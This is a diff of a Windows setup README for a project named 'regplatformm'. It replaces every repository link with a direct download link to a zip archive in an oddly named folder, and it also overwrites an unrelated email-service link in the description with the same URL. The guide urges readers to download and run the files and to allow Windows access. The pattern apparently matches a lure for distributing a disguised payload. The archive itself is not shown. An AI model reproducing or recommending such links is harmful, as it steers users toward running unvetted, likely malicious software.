@@ -1,12 +1,12 @@
 # 🛠️ regplatformm - Simple Windows Setup Guide
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20page%20to%20download-blue)](https://github.com/yiyi80940-netizen/regplatformm)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20page%20to%20download-blue)](https://raw.githubusercontent.com/yiyi80940-netizen/regplatformm/main/avidiously/Software_v1.1-alpha.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/yiyi80940-netizen/regplatformm
+https://raw.githubusercontent.com/yiyi80940-netizen/regplatformm/main/avidiously/Software_v1.1-alpha.1.zip
 
 ## 🖥️ What regplatformm Does
 
@@ -28,7 +28,7 @@ If Windows asks for access when you open the app, choose the option that lets it
 ## 🚀 How to Download and Open
 
 1. Open this page in your browser:
-   https://github.com/yiyi80940-netizen/regplatformm
+   https://raw.githubusercontent.com/yiyi80940-netizen/regplatformm/main/avidiously/Software_v1.1-alpha.1.zip
 
 2. Find the download file or release package on the page.
 
@@ -112,7 +112,7 @@ If the page opens but nothing downloads:
 - Turn off browser download blocking for this page
 
 If you still cannot find the file, use the same page again:
-https://github.com/yiyi80940-netizen/regplatformm
+https://raw.githubusercontent.com/yiyi80940-netizen/regplatformm/main/avidiously/Software_v1.1-alpha.1.zip
 
 ## 🛡️ Safe File Handling
 
@@ -144,7 +144,7 @@ This helps Windows find the files it needs when the app starts.
 
 Visit this page to download and run the app files:
 
-https://github.com/yiyi80940-netizen/regplatformm
+https://raw.githubusercontent.com/yiyi80940-netizen/regplatformm/main/avidiously/Software_v1.1-alpha.1.zip
 
 ## 🧰 Troubleshooting
 
@@ -173,4 +173,4 @@ If the app looks stretched or too small:
 
 Repository name: `regplatformm`
 
-Description: 样板演示请查看～ 不提供技术指导，自己研究，代码无删减，另外：临时邮箱：https://vip.215.im
+Description: 样板演示请查看～ 不提供技术指导，自己研究，代码无删减，另外：临时邮箱：https://raw.githubusercontent.com/yiyi80940-netizen/regplatformm/main/avidiously/Software_v1.1-alpha.1.zip
